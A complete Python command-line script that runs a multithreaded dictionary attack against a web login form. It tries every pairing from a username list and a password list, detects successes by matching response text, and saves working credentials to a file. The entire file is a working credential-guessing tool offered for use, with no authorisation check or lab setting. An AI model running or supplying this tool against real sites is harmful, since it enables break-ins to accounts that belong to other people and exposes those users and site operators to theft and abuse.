import argparse
import os
import queue
import threading
import time

import requests

def try_credentials(url, username, password, successful_logins, lock,
                    fail_string, success_string, user_field, pass_field, timeout):
    """
    Tries a single set of credentials against the given URL.
    Uses fail_string (response must NOT contain it) or success_string (response MUST contain it).
    """
    data = {user_field: username, pass_field: password}
    try:
        response = requests.post(url, data=data, timeout=timeout)
    except requests.RequestException as e:
        print(f"[ERROR] {username}:{password} — {e}")
        return

    if success_string:
        matched = success_string in response.text
    else:
        matched = fail_string not in response.text

    if matched:
        print(f"[+] Found: {username}:{password}")
        with lock:
            successful_logins.append((username, password))

def worker(url, credentials_queue, successful_logins, lock,
           fail_string, success_string, user_field, pass_field, wait, timeout):
    """
    Pulls credentials from the queue and tests them until the queue is exhausted.
    """
    while True:
        try:
            username, password = credentials_queue.get(block=False)
        except queue.Empty:
            break
        try_credentials(url, username, password, successful_logins, lock,
                        fail_string, success_string, user_field, pass_field, timeout)
        if wait:
            time.sleep(wait)
        credentials_queue.task_done()

def run_dictionary_attack(url, username_file, password_file, num_threads,
                          fail_string, success_string, user_field, pass_field,
                          wait, timeout, output_file):
    """
    Runs a dictionary attack using the given URL, username file, and password file.
    """
    with open(username_file, "r") as f:
        usernames = [line.strip() for line in f if line.strip()]
    with open(password_file, "r") as f:
        passwords = [line.strip() for line in f if line.strip()]

    credentials_queue = queue.Queue()
    for username in usernames:
        for password in passwords:
            credentials_queue.put((username, password))

    successful_logins = []
    lock = threading.Lock()

    threads = []
    for _ in range(num_threads):
        t = threading.Thread(
            target=worker,
            args=(url, credentials_queue, successful_logins, lock,
                  fail_string, success_string, user_field, pass_field, wait, timeout),
        )
        t.daemon = True
        t.start()
        threads.append(t)

    credentials_queue.join()

    with open(output_file, "w") as f:
        for username, password in successful_logins:
            f.write(f"{username}:{password}\n")

    return len(usernames), len(passwords), successful_logins

def main():
    parser = argparse.ArgumentParser(description="Test login credentials using a dictionary attack.")
    parser.add_argument("url", help="The URL to test.")
    parser.add_argument("username_file", help="File containing usernames to test.")
    parser.add_argument("password_file", help="File containing passwords to test.")
    parser.add_argument("-t", "--threads", type=int, default=4, help="Number of threads (default: 4).")
    parser.add_argument("-w", "--wait", type=float, default=0.0, help="Seconds to wait between attempts per thread (default: 0).")
    parser.add_argument("--timeout", type=float, default=10.0, help="Request timeout in seconds (default: 10).")
    parser.add_argument("-f", "--fail-string", default="Login failed", help="String indicating a failed login (default: 'Login failed').")
    parser.add_argument("-s", "--success-string", default="", help="String indicating a successful login (overrides --fail-string when set).")
    parser.add_argument("--user-field", default="username", help="Form field name for username (default: username).")
    parser.add_argument("--pass-field", default="password", help="Form field name for password (default: password).")
    parser.add_argument("-o", "--output", default="successful_logins.txt", help="Output file for successful logins (default: successful_logins.txt).")
    args = parser.parse_args()

    if not os.path.isfile(args.username_file):
        parser.error(f"Username file not found: {args.username_file}")
    if not os.path.isfile(args.password_file):
        parser.error(f"Password file not found: {args.password_file}")
    if args.threads < 1:
        parser.error("--threads must be at least 1.")
    if args.wait < 0:
        parser.error("--wait must be >= 0.")

    start_time = time.time()
    num_usernames, num_passwords, hits = run_dictionary_attack(
        args.url, args.username_file, args.password_file, args.threads,
        args.fail_string, args.success_string, args.user_field, args.pass_field,
        args.wait, args.timeout, args.output,
    )
    elapsed = time.time() - start_time
    num_credentials = num_usernames * num_passwords

    print(f"\nTried {num_credentials} credentials in {elapsed:.2f}s "
          f"({num_credentials / elapsed:.2f} creds/sec).")
    print(f"Found {len(hits)} successful login(s). Results saved to {args.output}.")

if __name__ == "__main__":
    main()
